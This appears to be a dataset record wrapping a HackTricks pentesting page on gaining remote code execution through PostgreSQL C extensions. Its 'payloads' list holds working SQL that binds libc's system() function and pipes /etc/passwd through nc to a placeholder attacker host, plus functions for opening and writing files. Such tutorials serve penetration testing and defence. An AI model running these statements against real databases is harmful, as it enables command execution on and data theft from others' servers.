{
  "id": "pentesting_web_029c5b1df41a",
  "category": "pentesting-web",
  "title": "rce with postgresql extensions",
  "description": "# RCE with PostgreSQL Extensions\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## PostgreSQL Extensions\n\nPostgreSQL has been developed with extensibility as a core feature, allowing it to seamlessly integrate extensions as if they were built-in functionalities. These extensions, essentially libraries written in C, enrich the database with additional functions, operators, or types.\n\nFrom version 8.1 onwards, a specific requirement is imposed on the extension libraries: they must be compi",
  "payloads": [
    "# RCE with PostgreSQL Extensions",
    "{{#include ../../../banners/hacktricks-training.md}}",
    "## PostgreSQL Extensions",
    "PostgreSQL has been developed with extensibility as a core feature, allowing it to seamlessly integrate extensions as if they were built-in functionalities. These extensions, essentially libraries written in C, enrich the database with additional functions, operators, or types.",
    "From version 8.1 onwards, a specific requirement is imposed on the extension libraries: they must be compiled with a special header. Without this, PostgreSQL will not execute them, ensuring only compatible and potentially secure extensions are used.",
    "Also, keep in mind that **if you don't know how to** [**upload files to the victim abusing PostgreSQL you should read this post.**](big-binary-files-upload-postgresql.md)",
    "### RCE in Linux",
    "**For more information check: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**",
    "The execution of system commands from PostgreSQL 8.1 and earlier versions is a process that has been clearly documented and is straightforward. It's possible to use this: [Metasploit module](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).",
    "```sql",
    "CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;",
    "SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');",
    "# You can also create functions to open and write files",
    "CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;",
    "CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md"
  ]
}